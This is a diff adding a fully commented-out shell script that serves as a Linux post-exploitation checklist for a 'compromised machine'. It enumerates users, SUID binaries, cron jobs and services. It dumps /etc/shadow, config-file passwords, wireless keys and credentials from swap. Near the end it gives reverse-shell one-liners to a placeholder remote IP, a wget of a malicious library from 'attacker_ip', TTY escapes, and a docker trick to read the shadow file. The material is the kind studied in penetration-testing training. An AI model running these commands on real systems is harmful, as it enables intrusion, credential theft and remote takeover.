@@ -1,0 +1,245 @@
+#!/bin/sh
+
+#HISTFILE=~/.bash_history
+#set -o history
+
+##Is the kernel vulnerable to any exploits?
+#echo -e "kernel Version Detection Attempt:"
+#kernelVersion=`history | grep "uname" | grep -v "kernelVersion="`
+#echo -e "$kernelVersion"
+
+##Does the current OS have any known exploitable vulnerabilities
+#echo -e "\nOS Detection Attempt:"
+#OS=`history | grep "/etc/issue" | grep -v "OS="`
+#echo -e "$OS"
+
+##Any processes running with high/root privileges?
+#echo -e "\nRunning Processes: with high/root privileges:"
+#runningProcess=`ps auxw > runningProcess`
+#echo -e "runningProcess File Createed in `pwd`"
+
+##Is the currently compromised machine routed to other networks?
+#echo -e "\nNetwork Routes:"
+#networkRoutes=`route -n`
+#echo -e "$networkRoutes"
+
+##Can additional information be obtained from the DNS server? Active Directory Accounts, Zone Transfers, etc
+#echo -e "\nDNS Server:"
+#dns=`cat /etc/resolv.conf | grep -v "#"`
+#echo -e "$dns"
+
+##Are the other machines accessible from the compromised machine?
+#echo -e "\nARP"
+#arp=`arp -a`
+#echo -e "$arp"
+
+##Current Network Connections
+#echo -e "\nCurrent Network Connections:"
+#networkConnection=`netstat -auntp > networkConnection`
+#echo -e "networkConnection File Created in `pwd`"
+
+##Can the current user access sensitive information/configuration details that belong to other users?
+#echo -e "\nCurrent user permissions:"
+#user=`whoami`
+#userPerm=`find / -user $user`
+#echo -e "$userPerm"
+
+##How many users on the system? What groups do users belong to? Can files belonging to users in other groups be modified?
+#echo -e "\nUID and GID Information for all users:"
+#allUser=`for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done`
+#echo -e "$allUser"
+
+##Who’s been on the system? From what systems?
+#echo -e "\nLast logged on users"
+#lastLogged=`last -a`
+#echo -e "$lastLogged"
+
+##How many UID 0 (root) accounts are on the system?
+#echo -e "Root Accounts:"
+#rootAccount=`cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk '{print $1}'`
+#echo -e "$rootAccount"
+
+##Do any of the service accounts (i.e., www-data) have shells defined?
+#echo -e "\nService Accounts:"
+#serviceAccount=`cat /etc/passwd`
+#echo -e "$serviceAccount"
+
+##Is access to other users’ home directories allowed? Is any of the information contained in those directories useful?
+#echo -e "\nHome Directories"
+#homeDirectories=`ls -als /home/*`
+#echo -e "$homeDirectories"
+
+##Can the current user execute anything with elevated privileges?
+#echo -e "\nCan the current user execute anything with elevated privileges?:"
+#canExec=`sudo -l`
+#echo -e "$canExec"
+
+##Are there any setuid root (SUID) binaries on the system which may be vulnerable to privilege escalation?
+#echo -e "\n(SUID) binaries on the system:"
+#suidBinary=`find / -perm -4000 -type f 2>/dev/null`
+#echo -e "$suidBinary"
+
+##Can attackers read configuration files that might contain sensitive information, passwords, etc.?
+#echo -e "\nCan attackers read configuration files? "
+#configFile=`grep "password" /etc/*.conf 2> /dev/null`
+#echo -e "$configFile"
+
+##Can attackers read the shadow file?
+#echo -e "\nRead Shadow File:"
+#shadowFile=`cat /etc/shadow`
+#echo -e "$shadowFile"
+
+##Can attackers list or read the contents of the /root directory?
+#echo -e "\nCan attackers list or read the contents of the /root directory?"
+#listContent=`ls -las /root`
+#echo -e "$listContent"
+
+##Can attackers read other users’ history files?
+#echo -e "\nCan attackers read other users’ history files?"
+#historyFile=`find /* -name *.*history* -print 2> /dev/null`
+#echo -e "$historyFile"
+
+##Can attackers write to directories that are configured to serve web pages?
+#echo -e "\nCan attackers write to directories that are configured to serve web pages?"
+#writeDir=`touch /var/www/file`
+#echo -e "$writeDir"
+
+##Which services are configured on the system and what ports are they opening?
+#echo -e "\nOpen Ports And Services: "
+#openPort=`netstat -auntp`
+#echo -e "$openPort"
+
+##Are service configuration files readable or modifiable by the current user?
+#echo -e "\nAre service configuration files readable or modifiable by the current user?"
+#serviceReadable=`find /etc/init.d/ ! -uid 0 -type f 2>/dev/null |xargs ls -la`
+#echo -e "$serviceReadable"
+
+##Can attackers modify the configuration of a service in such a way that gives them elevated privileges?
+#echo -e "\nCan attackers modify the configuration of a service?"
+#Edit Service Configuration File
+#echo -e "$"
+
+##Do the configuration files contain any information attackers can use to their advantage?
+#echo -e "\nDo the configuration files contain any information attackers can use to their advantage?"
+#configFileService=`cat /etc/mysql/my.cnf`
+#echo -e "$configFileService"
+
+##Can attackers stop or start the service as the current user?
+#echo -e "\nCan attackers stop or start the service as the current user?"
+#changeService=`service apache2 status`
+#echo -e "$changeService"
+
+##What tasks or jobs is the system configured to run and at which times?
+#echo -e "\nWhat tasks or jobs is the system configured to run and at which times?"
+#cronTab=`cat /etc/crontab`
+#cronDir=`ls -als /etc/cron.*`
+#echo -e "Crontab Config: \n$cronTab"
+#echo -e "Cron File: \n$cronDir"
+
+##Are there any custom jobs or tasks configured as root that world-writable?
+#echo -e "\nAre there any custom jobs or tasks configured as root that world-writable?"
+#costumJob=`find /etc/cron* -type f -perm -o+w -exec ls -l {} \;`
+#echo -e "$costumJob"
+
+##Can attackers modify any of the existing tasks at all?
+#echo -e "\nCan attackers modify any of the existing tasks at all?"
+#modfiyFile=`touch /etc/cron.d/test`
+#echo -e "$modfiyFile"
+
+##What software packages are installed on the system?
+#echo -e "\nWhat software packages are installed on the system?"
+#softPack=`dpkg -l`
+#echo -e "$softPack"
+
+##What versions? Are the versions installed out-of-date and vulnerable to existing available exploits?
+#echo -e "\nWhat versions?"
+#softPackVer=`dpkg -l`
+#echo -e "$softPackVer"
+
+##Does any of the installed software allow attackers to modify their configuration files and could this result in gaining privileged access to the system?
+#echo -e "\nDoes attackers allow to modify their configuration files?"
+#modifyPack="Try and modify package configurations."
+#echo -e "$"
+
+##Listen to a specific port
+#echo -e "\nListen to a specific port XXXXX:"
+#remotePort="xxxxx"
+#listenPort=`nc -l -p $remotePort`
+#echo -e "$listenPort"
+
+##Provide a remote machine with shell access
+#echo -e "\nProvide a remote machine with shell access to xxx.xxx.xxx.xxx:"
+#remoteIP="xxx.xxx.xxx.xxx"
+#remotePort="xxxxx"
+#ncCommand=`nc $remoteIP 4444 –e /bin/bash`
+#bashCommand=`bash -i >& /dev/tcp/$remoteIP/$remotePort 0>&1`
+#mknodCommand=`mknod /tmp/backpipe p /bin/sh 0</tmp/backpipe | nc $remoteIP $remotePort 1>/tmp/backpipe`
+#echo -e "$ncCommand"
+#echo -e "$bashCommand"
+#echo -e "$mknodCommand"
+
+##Find dotfiles files with “history” in their names
+#echo -e "\nDotfiles files with “history” in their names: "
+#dotFiles=`find /* -name *.*history* -print 2> /dev/null`
+#echo -e "$dotFiles"
+
+##Grep the apache access.log file for “user” and “pass” strings
+#echo -e "\nGrep the apache access.log file for “user” and “pass” strings:"
+#apacheAccessFile=`cat /var/log/apache2/access.log |grep -E "^user|^pass"`
+#echo -e "$apacheAccessFile"
+
+##Dump cleartext Pre-Shared Wireless Keys from Network Manager
+#echo -e "\nDump cleartext Pre-Shared Wireless Keys from Network Manager:"
+#wirelessKey=`cat /etc/NetworkManager/system-connections/* |grep -E "^id|^psk"`
+#echo -e "$wirelessKey"
+
+##Get a better understanding of your environment
+#echo -e "\nGet a better understanding of environment: "
+#envArg=`env`
+#echo -e "$envArg"
+
+##Possible restricted shell escape or creation of interactive TTY
+#echo -e "\nPossible restricted shell escape or creation of interactive TTY: "
+#pythonBased=`python -c 'import pty; pty.spawn("/bin/sh")'`
+#perlBased=`perl -e 'exec "/bin/sh";'`
+#echo -e "$pythonBased"
+#echo -e "$perlBased"
+
+##Identifying the partition or “file” defined as the swap file for later pilfering credentials from swap memory
+#echo -e "\nIdentifying the partition or “file” defined as the swap file: "
+#swapPath="/dev/sda1"
+#swapTest1=`swapon -s`
+#swapTest2=`cat /proc/swaps`
+#swapTest3=`strings $swapPath |grep "password="`
+#swapTest4=`strings $swapPath |grep "&password="`
+#echo -e "$swapTest1"
+#echo -e "$swapTest2"
+#echo -e "$swapTest3"
+#echo -e "$swapTest4"
+
+##Possible code execution attempt via shared object library loading
+#echo -e "\nPossible code execution attempt via shared object library loading:"
+#codeExec1=`ldd /usr/local/bin/program`
+#codeExec2=`objdump -x /usr/local/bin/program |grep RPATH`
+#codeExec3=`objdump -x /usr/local/bin/program |grep RUNPATH`
+#codeExec4=`cd /tmp/program/libs && wget http://attacker_ip/program.so`
+#echo -e "$codeExec1"
+#echo -e "$codeExec2"
+#echo -e "$codeExec3"
+#echo -e "$codeExec4"
+
+##Unix socket exploitation attempt
+#echo -e "\nUnix socket exploitation attempt: "
+#dockerTest=`
+#docker run -v /etc/shadow:/docker/hashedpasswords -d postgres
+#docker exec -ti CONTAINER_ID
+#bash
+#cat /docker/hashedpasswords >
+#/docker/test.txt
+#chmod 777 /docker/test.txt
+#cat /docker/test.txt
+#`
+#echo -e "$dockerTest"
+
+
+
